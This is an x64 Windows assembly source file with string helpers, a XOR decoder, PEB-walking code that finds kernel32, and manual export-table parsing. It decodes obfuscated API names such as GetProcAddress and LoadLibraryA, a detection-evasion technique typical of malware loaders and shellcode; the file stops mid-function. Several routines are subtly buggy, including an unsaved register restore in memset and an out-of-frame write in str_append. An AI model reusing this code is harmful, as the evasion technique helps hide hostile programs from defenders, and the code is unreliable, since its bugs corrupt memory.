; arg0: src         rcx
; arg1: dst         rdx
; arg2: nBytes      r8
memcpy:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; src
    mov [rbp + 24], rdx             ; dst
    mov [rbp + 32], r8              ; nBytes

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; src
    mov rdi, [rbp + 24]             ; dst
    mov rcx, [rbp + 32]             ; nBytes

    rep movsb                       ; move from rsi to rdi until rcx == 0

    mov rdi, [rbp - 24]             ; save rdi
    mov rsi, [rbp - 16]             ; save rsi
    mov rax, [rbp - 8]              ; return value

    leave
    ret

; arg0: mem             rcx
; arg1: value           rdx
; arg2: count           r8
memset:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx             ; mem
        mov [rbp + 24], rdx             ; value
        mov [rbp + 32], r8              ; count

        ; rbp - 8 = return value
        ; rbp - 16 = save rdi
        sub rsp, 16

        mov rdi, [rbp + 16]             ; mem
        mov rax, [rbp + 24]             ; value
        mov rcx, [rbp + 32]             ; count

    .loop:
        stosb

        dec rcx
        jnz .loop

    .shutdown:
        mov rax, [rbp - 8]              ; return value
        mov rsi, [rbp - 16]             ; restore rsi

        leave
        ret


; arg0: str             rcx
;
; ret: num chars        rax
strlen:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                 ; str

    ; rbp - 8 = output strlen
    ; rbp - 16 = rsi
    sub rsp, 16                         ; allocate local variable space
    
    mov qword [rbp - 8], 0              ; strlen = 0
    mov [rbp - 16], rsi                 ; save rsi

    mov rsi, [rbp + 16]                 ; str

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]            ; ++strlen

        .while_condition:
            lodsb                       ; load from mem to al

            cmp al, 0                   ; end of string ?
            jne .loop
    
    mov rsi, [rbp - 16]                 ; restore rsi 
    mov rax, [rbp - 8]                  ; strlen in rax

    leave
    ret

; arg0: wstr        rcx
;
; ret: num chars    rax
wstrlen:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; wstr

    ; rbp - 8 = output strlen
    ; rbp - 16 = rsi
    sub rsp, 16                             ; allocate local variable space

    mov qword [rbp - 8], 0                  ; return value
    mov [rbp - 16], rsi                     ; save rsi

    mov rsi, [rbp + 16]                     ; wstr

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]                ; ++strlen

        .while_condition:
            lodsw                           ; load from mem to ax

            cmp ax, 0                       ; end of string ?
            jne .loop
    
    mov rsi, [rbp - 16]                     ; restore rsi
    mov rax, [rbp - 8]                      ; strlen in rax
    
    leave
    ret

; arg0: src        rcx
; arg1: dst        rdx
strcpy:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; src
    mov [rbp + 24], rdx             ; dst

    ; rbp - 8 = return value
    ; rbp - 16 = save rsi
    ; rbp - 24 = save rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; src
    mov rdi, [rbp + 24]             ; dst

.loop:
    lodsb                           ; not using movsb so the byte can be checked if it is 0, and esi advances before check, so check is incorrect
    stosb                           ; storing before checking because we need the zero at the end of the string to be copied too

    cmp al, 0                       ; end of string ?
    je .loop_end                    ; yes

    jmp .loop

.loop_end:
    
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    leave
    ret

; arg0: src        rcx
; arg1: dst        rdx
wstrcpy:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; src
    mov [rbp + 24], rdx             ; dst

    ; rbp - 8 = return value
    ; rbp - 16 = save rsi
    ; rbp - 24 = save rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; src
    mov rdi, [rbp + 24]             ; dst

.loop:
    lodsw                           ; not using movsb so the byte can be checked if it is 0, and esi advances before check, so check is incorrect
    stosw                           ; storing before checking because we need the zero at the end of the string to be copied too

    cmp ax, 0                       ; end of string ?
    je .loop_end                    ; yes

    jmp .loop

.loop_end:
    
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    leave
    ret

; arg0: src        rcx
; arg1: dst        rdx
wstrcpya:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; src
    mov [rbp + 24], rdx             ; dst

    ; rbp - 8 = return value
    ; rbp - 16 = save rsi
    ; rbp - 24 = save rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; src
    mov rdi, [rbp + 24]             ; dst

.loop:
    lodsw                           ; not using movsb so the byte can be checked if it is 0, and esi advances before check, so check is incorrect
    stosb                           ; storing before checking because we need the zero at the end of the string to be copied too

    cmp ax, 0                       ; end of string ?
    jne .loop                       ; no

.loop_end:
    
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    leave
    ret

; arg0: src         rcx
; arg1: dst         rdx
astrcpyw:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx         ; src
        mov [rbp + 24], rdx         ; dst

        ; rbp - 8 = return value
        ; rbp - 16 = save rsi
        ; rbp - 24 = save rdi
        ; rbp - 32 = padding byte
        sub rsp, 32                     ; local space, padding bytes
        mov qword [rbp - 8], 0          ; return value
        mov [rbp - 16], rsi             ; save rsi
        mov [rbp - 24], rdi             ; save rdi

        mov rsi, [rbp + 16]             ; src
        mov rdi, [rbp + 24]             ; dst

        xor eax, eax                    ; zero out so we store ax, after loading just al

    .loop:
        lodsb                           ; not using movsb so the byte can be checked if it is 0, and esi advances before check, so check is incorrect
        stosw                           ; storing before checking because we need the zero at the end of the string to be copied too

        cmp al, 0                       ; end of string?
        jne .loop                       ; no

    .loop_end:
    
        mov rdi, [rbp - 24]             ; restore rdi
        mov rsi, [rbp - 16]             ; restore rsi
        mov rax, [rbp - 8]              ; return value

        leave
        ret

; arg0: str             rcx
; arg1: wstr            rdx
;
; ret: 1 if equal       rax
strcmpAW:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr

.loop:
    movzx eax, byte [rsi]
    movzx edx, byte [rdi]

    cmp al, dl
    jne .loop_end_not_equal

    cmp al, 0                       ; end of string ?
    je .loop_end_equal

    inc qword rsi
    add rdi, 2
    jmp .loop

    .loop_end_equal:
        mov qword [rbp - 8], 1      ; return value

        jmp .shutdown

    .loop_end_not_equal:
        mov qword [rbp - 8], 0      ; return value
        jmp .shutdown

.shutdown:
    mov rdi, [rbp - 24]         ; restore rdi
    mov rsi, [rbp - 16]         ; restore rsi
    mov rax, [rbp - 8]           ; return value

    leave
    ret

; arg0: str             rcx
; arg1: wstr            rdx
;
; ret: 1 if equal       rax
strcmpiAW:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr

.loop:
    movzx eax, byte [rsi]
    movzx edx, byte [rdi]

    cmp al, dl

    jg .al_more_than_dl
    jl .al_less_than_dl

.continue_loop:
    cmp al, 0                       ; end of string ?
    je .loop_end_equal

    inc rsi
    add rdi, 2

    jmp .loop

    .al_more_than_dl:
        add dl, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

    .al_less_than_dl:
        add al, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

.loop_end_not_equal:
    mov qword [rbp - 8], 0          ; return value
    jmp .shutdown

.loop_end_equal:
    mov qword [rbp - 8], 1          ; return value
    jmp .shutdown

.shutdown:
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    leave
    ret


; arg0: str1                    rcx
; arg1: str2                    rdx
;
; ret: 1 if equal               rax
strcmpAA:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str1
    mov [rbp + 24], rdx             ; str2

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str1
    mov rdi, [rbp + 24]             ; str2

.loop:
    cmpsb
    jne .not_equal

    mov al, [rsi]                   ; cannot use lodsb since it incr esi
    cmp al, 0                       ; end of string ?
    je .equal

    jmp .loop

    .not_equal:
        mov qword [rbp - 8], 0      ; return value
        jmp .shutdown

    .equal:
        mov qword [rbp - 8], 1      ; return value
        jmp .shutdown

.shutdown:
    mov rdi, [rbp - 24]         ; restore rdi
    mov rsi, [rbp - 16]         ; restore rsi

    mov rax, [rbp - 8]          ; return value

    leave
    ret

; arg0: str                     rcx
; arg1: wstr                    rdx
;
; ret: 1 if equal               rax
strcmpiAA:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str
    mov [rbp + 24], rdx             ; wstr

    ; rbp - 8 = return value
    ; rbp - 16 = rsi
    ; rbp - 24 = rdi
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value
    mov [rbp - 16], rsi             ; save rsi
    mov [rbp - 24], rdi             ; save rdi

    mov rsi, [rbp + 16]             ; str
    mov rdi, [rbp + 24]             ; wstr

.loop:
    movzx eax, byte [rsi]
    movzx edx, byte [rdi]

    cmp al, dl
    jg .al_more_than_dl
    jl .al_less_than_dl

.continue_loop:
    cmp al, 0                       ; end of string ?
    je .loop_end_equal

    inc rsi
    inc rdi

    jnz .loop

    .al_more_than_dl:
        add dl, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

    .al_less_than_dl:
        add al, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

.loop_end_not_equal:
    mov qword [rbp - 8], 0          ; return value
    jmp .shutdown

.loop_end_equal:
    mov qword [rbp - 8], 1          ; return value
    jmp .shutdown

.shutdown:
    mov rdi, [rbp - 24]             ; restore rdi
    mov rsi, [rbp - 16]             ; restore rsi
    mov rax, [rbp - 8]              ; return value

    leave
    ret


; arg0: str                     rcx
; arg1: chr                     rdx
;
; return: ptr to chr            rax
strchr:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; str 
    mov [rbp + 24], rdx             ; chr

    ; rbp - 8 = cRet
    ; rbp - 16 = strlen
    ; rbp - 24 = c
    ; rbp - 32 = rbx
    sub rsp, 32                     ; allocate local variable space
    sub rsp, 32                     ; allocate shadow space

    mov qword [rbp - 8], -1         ; cRet = 0
    mov [rbp - 32], rbx             ; save rbx

    mov rcx, [rbp + 16]             ; str
    call strlen                     ; strlen

    mov [rbp - 16], rax             ; strlen

    mov qword [rbp - 24], 0         ; c = 0
    .loop:
        mov rdx, [rbp + 16]         ; str in rdx     
        mov rbx, [rbp - 24]         ; c in rbx

        movzx ecx, byte [rdx + rbx] ; sStr[c]

        cmp cl, [rbp + 24]          ; sStr[c] == chr ?

        je .equal

        inc qword [rbp - 24]        ; ++c
        mov rax, [rbp - 16]         ; strlen in rax
        cmp [rbp - 24], rax         ; c < strlen ?

        jne .loop
        jmp .shutdown

        .equal:
            add rdx, rbx
            mov [rbp - 8], rdx     ; cRet = str + c

            jmp .shutdown

.shutdown:
    mov rbx, [rbp - 32]             ; restore rbx
    mov rax, [rbp - 8]              ; return value

    leave
    ret

; arg0: str to find in              rcx
; arg1: str to find                 rdx
;
; ret: ptr if found, 0 otherwise    rax
str_contains:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx             ; find in str
        mov [rbp + 24], rdx             ; find str

        ; rbp - 8 = return value
        ; rbp - 16 = find in str len
        ; rbp - 24 = find str len
        ; rbp - 32 = find in char loop counter
        sub rsp, 32                     ; allocate local variable space, padding
        sub rsp, 32                     ; allocate shadow space, padding

        ; init values
        mov qword [rbp - 8], 0          ; return value
        mov qword [rbp - 32], 0         ; find in char loop counter
        
        ; find find in str len
        mov rcx, [rbp + 16]             ; find in str
        call strlen

        mov [rbp - 16], rax             ; find in str len

        ; find find str len
        mov rcx, [rbp + 24]             ; find str
        call strlen

        mov [rbp - 24], rax             ; find str len

        ; compare each char of the find in str to the find str
        ; and if match is found then see if subsequent chars
        ; match the find str

        mov rsi, [rbp + 16]             ; find in str
        mov rdi, [rbp + 24]             ; find str

    .loop:
        cmp byte [rsi], 0               ; end of find in str?
        je .shutdown

        mov rcx, [rbp - 24]             ; find str len
        .inner_loop:
            cmpsb

            jne .inner_loop_done

            dec rcx
            jz .find_str_found

            jmp .inner_loop

        .inner_loop_done:

        inc qword [rbp - 32]            ; find in char loop counter
        mov rdi, [rbp + 24]             ; find str
        mov rsi, [rbp + 16]             ; find in str
        add rsi, [rbp - 32]             ; find in char loop counter

        jmp .loop

    .find_str_found:
        mov qword [rbp - 8], 1          ; return value
        
    .shutdown:
        mov rax, [rbp - 8]              ; return value

        leave
        ret
        

; arg0: wstr to find in             rcx
; arg1: wstr to find                rdx
;
; ret: 1 if contains 0 otherwise    rax
wstr_contains:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx             ; find in wstr
        mov [rbp + 24], rdx             ; find wstr

        ; rbp - 8 = return value
        ; rbp - 16 = find in wstr len
        ; rbp - 24 = find wstr len
        ; rbp - 32 = find in char loop counter
        sub rsp, 32                     ; local variable space, padding
        sub rsp, 32                     ; shadow space, padding

        ; init values
        mov qword [rbp - 8], 0          ; return value
        mov qword [rbp - 32], 0         ; find in char loop counter

        ; find find in wstr len
        mov rcx, [rbp + 16]             ; find in wstr
        call wstrlen

        mov [rbp - 16], rax             ; find in wstr len

        ; find find wstr len
        mov rcx, [rbp + 24]             ; find wstr
        call wstrlen

        mov [rbp - 24], rax             ; find wstr len

        ; compare each char of the find in wstr to the find wstr
        ; and if match is found then see if subsequent chars
        ; match the find wstr

        mov rsi, [rbp + 16]             ; find in wstr
        mov rdi, [rbp + 24]             ; find wstr

    .loop:
        cmp byte [rsi], 0               ; end of find in wstr?
        je .shutdown

        mov rcx, [rbp - 24]             ; find wstr len
        .inner_loop:
            cmpsw

            jne .inner_loop_done

            dec rcx
            jz .find_str_found

            jmp .inner_loop

        .inner_loop_done:

        add qword [rbp - 32], 2         ; find in char loop counter
        mov rdi, [rbp + 24]             ; find wstr
        mov rsi, [rbp + 16]             ; find in wstr
        add rsi, [rbp - 32]             ; find in char loop counter

        jmp .loop

    .find_str_found:
        mov qword [rbp - 8], 1          ; return value
        
    .shutdown:
        mov rax, [rbp - 8]              ; return value

        leave
        ret

; arg0: str1            rcx
; arg1: str2            rdx
str_append:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                         ; str1
    mov [rbp + 24], rdx                         ; str2

    ; rbp - 8 = return value
    ; rbp - 16 = str1 len
    sub rsp, 16                                 ; allocate local variable space

    mov rcx, [rbp + 16]                         ; str1
    call strlen

    mov [rbp - 32], rax                         ; str1 len

    mov rcx, [rbp + 24]                         ; str2
    mov rdx, [rbp + 16]                         ; str1
    add rdx, [rbp - 32]                         ; str1 len; points to the end of str1
    call strcpy

.shutdown:
    xor rax, rax

    leave
    ret

; arg0: data            rcx
; arg1: data_len        rdx
; arg2: key             r8
; arg3: key_len         r9
my_xor:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                         ; data
    mov [rbp + 24], rdx                         ; data len
    mov [rbp + 32], r8                          ; key
    mov [rbp + 40], r9                          ; key len

    ; rbp - 8 = return value
    ; rbp - 16 = i
    ; rbp - 24 = j
    ; rbp - 32 = bInput
    ; rbp - 40 = b
    ; rbp - 48 = data_bit_i
    ; rbp - 56 = key_bit_j
    ; rbp - 64 = bit_xor
    ; rbp - 72 = rbx
    ; rbp - 80 = 8 bytes padding
    sub rsp, 80                                 ; allocate local variable space

    mov qword [rbp - 8], 0                      ; return value
    mov qword [rbp - 16], 0                     ; i = 0
    mov qword [rbp - 24], 0                     ; j = 0
    mov [rbp - 72], rbx                         ; save rbx

    .data_loop:
        mov rax, [rbp - 24]                     ; j in rax
        cmp rax, [rbp + 40]                     ; j == key_len ?

        jne .continue_data_loop
        xor rax, rax
        mov [rbp - 24], rax                     ; j = 0
        
    .continue_data_loop:
        mov qword [rbp - 32], 0                 ; bInput = 0
        mov qword [rbp - 40], 0                 ; b = 0

        .bit_loop:
        ; bit test data
            xor rdx, rdx

            mov rdx, [rbp + 16]                 ; ptr to data in rdx
            mov rbx, [rbp - 16]                 ; i in rbx

            movzx eax, byte [rdx + rbx]         ; data char in al
            movzx ebx, byte [rbp - 40]          ; b in bl

            bt rax, rbx

            jc .data_bit_is_set
            mov qword [rbp - 48], 0             ; data_bit_i = 0
            jmp .bit_loop_continue_data

            .data_bit_is_set:
                mov qword [rbp - 48], 1         ; data_bit_i = 1

        .bit_loop_continue_data:
            ; bit test key

            mov rdx, [rbp + 32]                 ; ptr to key in rdx
            mov rbx, [rbp - 24]                 ; j in rbx
            
            movzx eax, byte [rdx + rbx]         ; key char in al
            movzx ebx, byte [rbp - 40]          ; b in bl

            bt rax, rbx

            jc .key_bit_is_set
            mov qword [rbp - 56], 0             ; key_bit_i = 0
            jmp .bit_loop_continue_key

            .key_bit_is_set:
                mov qword [rbp - 56], 1         ; key_bit_i = 1

        .bit_loop_continue_key:

            movzx eax, byte [rbp - 48]          ; data_bit_i in al
            cmp al, [rbp - 56]                  ; data_bit_i == key_bit_i ?

            je .bits_equal
            ; bits are unequal
            mov qword rax, 1
            movzx ecx, byte [rbp - 40]          ; b in cl
            shl al, cl
            mov [rbp - 64], al                  ; bit_xor = (data_bit_i != key_bit_j) << b

            jmp .bits_continue
            .bits_equal:
            ; bits equal
            ; so (data_bit_i != key_bit_j) == 0
                mov qword [rbp - 64], 0         ; bit_xor = 0

        .bits_continue:
            movzx eax, byte [rbp - 32]          ; bInput in al
            or al, [rbp - 64]                   ; bInput |= bit_xor

            mov [rbp - 32], al                  ; al to bInput

            inc qword [rbp - 40]                ; ++b
            mov qword rax, [rbp - 40]           ; b in rax
            cmp qword rax, 8                    ; b == 8 ?
            jnz .bit_loop


        mov qword rdx, [rbp + 16]               ; ptr to data in rdx
        mov qword rbx, [rbp - 16]                ; i in rbx

        movzx eax, byte [rbp - 32]              ; bInput in al
        mov [rdx + rbx], al                     ; data[i] = bInput

        inc qword [rbp - 24]                    ; ++j

        inc qword [rbp - 16]                     ; ++i
        mov rax, [rbp - 16]                      ; i in rax
        cmp rax, [rbp + 24]                     ; i == data_len ?

        jne .data_loop

.shutdown:
    mov rbx, [rbp - 72]                         ; restore rbx
    mov rax, [rbp - 8]                          ; return value

    leave
    ret


get_kernel_module_handle:
    push rbp
    mov rbp, rsp

    ; [rbp - 8] = First List Entry
    ; [rbp - 16] = Current List Entry
    ; [rbp - 24] = Table Entry
    ; [rbp - 32] = return addr
    sub rsp, 32                         ; allocate local variable space
    sub rsp, 32                         ; allocate shadow space

    mov rcx, kernel32_xor
    mov rdx, kernel32_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor                         ; kernel32.dll clear text

    mov rax, gs:[0x60]                  ; peb
    add rax, 0x18                       ; *ldr
    mov rax, [rax]                      ; ldr
    add rax, 0x20                       ; InMemoryOrderModuleList

    mov [rbp - 8], rax                  ; *FirstModule
    mov rax, [rax]
    mov [rbp - 16], rax                 ; CurrentModule
    mov qword [rbp - 32], 0             ; return code

.loop:
    cmp rax, [rbp - 8]                  ; CurrentModule == FirstModule ?
    je .loop_end_equal
        sub rax, 16                     ; *TableEntry
        mov [rbp - 24], rax             ; *TableEntry

        add rax, 0x58                   ; *BaseDLLName
        add rax, 0x8                    ; BaseDLLName.Buffer

        mov rcx, kernel32_xor
        mov rdx, [rax]
        call strcmpiAW

        cmp rax, 1                      ; strings match
        je .module_found

        mov rax, [rbp - 16]             ; CurrentModule
        mov rax, [rax]                  ; CurrentModule = CurrentModule->Flink
        mov [rbp - 16], rax             ; CurrentModule

        jmp .loop

.module_found:
    mov rax, [rbp - 24]                 ; *TableEntry
    add rax, 0x30                       ; TableEntry->DllBase
    mov rax, [rax]
    mov [rbp - 32], rax

    jmp .shutdown

.loop_end_equal:

.shutdown:
    mov rax, [rbp - 32]                 ; return code

    leave
    ret

; arg0: base addr           rcx
; arg1: proc name           rdx
;
; return: proc addr         rax
get_proc_address_by_name:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; base addr
    mov [rbp + 24], rdx                     ; proc name

    ; rbp - 8 = return value
    ; rbp - 16 = nt headers
    ; rbp - 24 = export data directory
    ; rbp - 32 = export directory
    ; rbp - 40 = address of functions
    ; rbp - 48 = address of names
    ; rbp - 56 = address of name ordinals
    ; rbp - 312 = forwarded dll.function name - 256 bytes
    ; rbp - 320 = function name
    ; rbp - 328 = loaded forwarded library addr
    ; rbp - 336 = function name strlen
    ; rbp - 344 = rbx
    ; rbp - 472 = dll name with extension -> not used, dll name used as is without .dll ext
    ; ebp - 480 = 8 bytes padding
    sub rsp, 480                            ; allocate local variable space
    sub rsp, 32                             ; allocate shadow space

    mov qword [rbp - 8], 0                  ; return value
    mov [rbp - 344], rbx                    ; save rbx

    mov rbx, [rbp + 16]                     ; base addr
    add rbx, 0x3c                           ; *e_lfa_new

    movzx ecx, word [rbx]                   ; e_lfanew

    mov rax, [rbp + 16]                     ; base addr
    add rax, rcx                            ; nt header

    mov [rbp - 16], rax                     ; nt header

    add rax, 24                             ; optional header
    add rax, 112                            ; export data directory

    mov [rbp - 24], rax                     ; export data directory

    mov rax, [rbp + 16]                     ; base addr
    mov rcx, [rbp - 24]                     ; export data directory
    mov ebx, [rcx]
    add rax, rbx                            ; export directory

    mov [rbp - 32], rax                     ; export directory

    add rax, 28                             ; address of functions rva
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of function rva

    mov [rbp - 40], rax                     ; address of functions

    mov rax, [rbp - 32]                     ; export directory
    add rax, 32                             ; address of names rva
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of names rva

    mov [rbp - 48], rax                     ; address of names

    mov rax, [rbp - 32]                     ; export directory
    add rax, 36                             ; address of name ordinals
    mov eax, [rax]                          ; rva in rax
    add rax, [rbp + 16]                     ; base addr + address of name ordinals

    mov [rbp - 56], rax                     ; address of name ordinals

    mov r10, [rbp - 32]                     ; export directory
    add r10, 24                             ; number of names
    mov r10d, [r10]                         ; number of names in r10

    xor r11, r11
.loop_func_names:
    ; to index into an array, we multiply the size of each element with the 
    ; current index and add it to the base addr of the array
    mov dword eax, 4                        ; size of dword
    mul r11                                 ; size * index
    mov rbx, [rbp - 48]                     ; address of names
    add rbx, rax                            ; address of names + n
    mov ebx, [rbx]                          ; address of names [n]

    add rbx, [rbp +  16]                    ; base addr + address of names [n]

    mov rcx, [rbp + 24]                     ; proc name
    mov rdx, rbx
    call strcmpiAA

    cmp rax, 1                              ; are strings equal
    je .function_found

    inc r11
    cmp r11, r10
    jne .loop_func_names

    jmp .shutdown

.function_found:
    mov rax, 2                              ; size of ordinal value
    mul r11                                 ; index * size of element of addrees of name ordinals(word)
    add rax, [rbp - 56]                     ; address of name ordinals + n
    movzx eax, word [rax]                   ; address of name ordinals [n]; index into address of functions

    mov rbx, 4                              ; size of element of address of functions(dword)
    mul rbx                                 ; index * size of element
    add rax, [rbp - 40]                     ; address of functions + index
    mov eax, dword [rax]                    ; address of functions [index]

    add rax, [rbp + 16]                     ; base addr + address of functions [index]

    mov [rbp - 8], rax                      ; return value

    ; check if the function is forwarded
    mov r8, [rbp + 16]                      ; base addr
    mov rax, [rbp - 24]                     ; export data directory
    mov eax, [rax]                          ; export data directory virtual address
    add r8, rax                             ; base addr + virtual addr

    mov r9, r8
    mov rax, [rbp - 24]                     ; export data directory
    add rax, 4                              ; export data directory size
    mov eax, [rax]                          ; export data directory size
    add r9, rax                             ; base addr + virtual addr + size

    cmp [rbp - 8], r8                       ; below the start of the export directory
    jl .shutdown                            ; not forwarded
                                            ; or
    cmp [rbp - 8], r9                       ; above the end of the export directory
    jg .shutdown                            ; not forwarded

    ; make a copy of the string of the forwarded dll
    mov rcx, [rbp - 8]                      ; return value (proc addr)
    mov rdx, rbp
    sub rdx, 312                            ; dll.functionname str
    call strcpy

    ; find the position of the '.' which separates the dll name and function name
    mov rcx, rbp
    sub rcx, 312
    mov rdx, '.'
    call strchr                             ; ptr to chr in rax
    
    mov byte [rax], 0                       ; replace the '.' with 0
    inc rax

    mov [rbp - 320], rax                    ; forwarded function name

    cmp qword [load_library_a], 0           ; is load_library_a proc avaiable
    je .error_shutdown
    
    mov rcx, rbp
    sub rcx, 312                            ; ptr to dll name + ext
    call [load_library_a]                   ; library addr

    mov [rbp - 328], rax                    ; library addr

    mov rcx, [rbp - 320]
    call strlen                             ; strlen in rax

    mov [rbp - 336], rax                    ; function name strlen

    mov rcx, [rbp - 328]
    mov rdx, [rbp - 320]
    mov r8, [rbp - 336]
    call get_proc_address_by_name           ; proc addr

    mov [rbp - 8], rax                      ; proc addr

    jmp .shutdown

.error_shutdown:
    mov qword [rbp - 8], 0                  ; proc addr not found

.shutdown:
    mov rbx, [rbp - 344]                    ; restore rbx
    mov rax, [rbp - 8]                      ; return value

    leave
    ret

; arg0: base addr               rcx
; arg1: xor str                 rdx
; arg2: xor str len             r8
; arg3: is get proc addr        r9
;
; return: proc addr             rax
unxor_and_get_proc_addr:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                         ; base addr
    mov [rbp + 24], rdx                         ; xor str
    mov [rbp + 32], r8                          ; xor str len
    mov [rbp + 40], r9                          ; is get proc addr

    ; rbp - 8 = return value
    ; rbp - 16 = 8 bytes padding
    sub rsp, 16                                 ; allocate local variable space
    sub rsp, 32                                 ; allocate shadow space

    mov rcx, [rbp + 24]                         ; xor str
    mov rdx, [rbp + 32]                         ; xor str len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor

    cmp qword [rbp + 40], 1                     ; is get proc addr
    jne .not_get_proc_addr
        mov rcx, [rbp + 16]                     ; base addr
        mov rdx, [rbp + 24]                     ; xor str
        mov r8, [rbp + 32]                      ; xor str len
        call get_proc_address_by_name

        mov [rbp - 8], rax                      ; proc addr

        jmp .shutdown

.not_get_proc_addr:
    mov rcx, [rbp + 16]                         ; base addr
    mov rdx, [rbp + 24]                         ; xor str
    call [get_proc_address]

    mov [rbp - 8], rax                          ; proc addr

.shutdown:
    mov rax, [rbp - 8]                          ; return value

    leave
    ret

; arg0: kernel base addr           rcx
populate_kernel_function_ptrs_by_name:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                         ; kernel base addr

    sub rsp, 32                                 ; allocate shadow space

    mov rcx, [rbp + 16]
    mov rdx, get_proc_address_xor
    mov r8, get_proc_address_xor.len
    mov r9, 1
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_proc_address], rax                    ; GetProcAddress addr

    mov rcx, [rbp + 16]
    mov rdx, get_last_error_xor
    mov r8, get_last_error_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_last_error], rax                   ; GetLastError addr

    mov rcx, [rbp + 16]
    mov rdx, load_library_a_xor
    mov r8, load_library_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [load_library_a], rax                   ; LoadLibraryA addr

    mov rcx, [rbp + 16]
    mov rdx, get_volume_information_a_xor
    mov r8, get_volume_information_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_volume_information_a], rax         ; GetVolumeInformationA addr

    mov rcx, [rbp + 16]
    mov rdx, get_volume_information_w_xor
    mov r8, get_volume_information_w_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_volume_information_w], rax         ; GetVolumeInformationW addr

    mov rcx, [rbp + 16]
    mov rdx, get_module_handle_a_xor
    mov r8, get_module_handle_a_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_module_handle_a], rax              ; GetModuleHandleA addr

    mov rcx, [rbp + 16]
    mov rdx, get_current_process_xor
    mov r8, get_current_process_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr                ; proc addr

